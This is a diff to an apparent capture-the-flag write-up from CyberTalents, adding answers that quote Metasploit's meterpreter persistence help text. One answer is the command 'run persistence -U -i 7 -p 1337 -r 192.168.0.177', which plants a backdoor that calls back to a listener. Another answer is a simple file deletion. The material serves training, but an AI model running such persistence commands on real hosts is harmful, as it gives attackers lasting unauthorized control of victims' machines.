@@ -33,4 +33,35 @@ Persistence options
     Minutes after restarting the system: 7 
 
 Flag format is the full command used in MSF
-#### Flag :
+
+If you look into the meterpeters help
+```
+
+[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
+[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
+Meterpreter Script for creating a persistent backdoor on a target host.
+
+OPTIONS:
+
+    -A        Automatically start a matching exploit/multi/handler to connect to the agent
+    -L   Location in target host to write payload to, if none %TEMP% will be used.
+    -P   Payload to use, default is windows/meterpreter/reverse_tcp.
+    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
+    -T   Alternate executable template to use
+    -U        Automatically start the agent when the User logs on
+    -X        Automatically start the agent when the system boots
+    -h        This help menu
+    -i   The interval in seconds between each connection attempt
+    -p   The port on which the system running Metasploit is listening
+    -r   The IP of the system running Metasploit listening for the connect back
+ ```
+
+#### Flag : run persistence -U -i 7 -p 1337 -r 192.168.0.177
+
+
+## Challenge Name: remove
+
+#### [Challenge Link](https://cybertalents.com/challenges/general-information/remove)
+#### Challenge Description I need to remove a file called secret in my home directory. which command should i use you 
+User's home directory /home/USERNAME/ or ~/ for short, contains user's files
+#### Flag : rm ~/secret
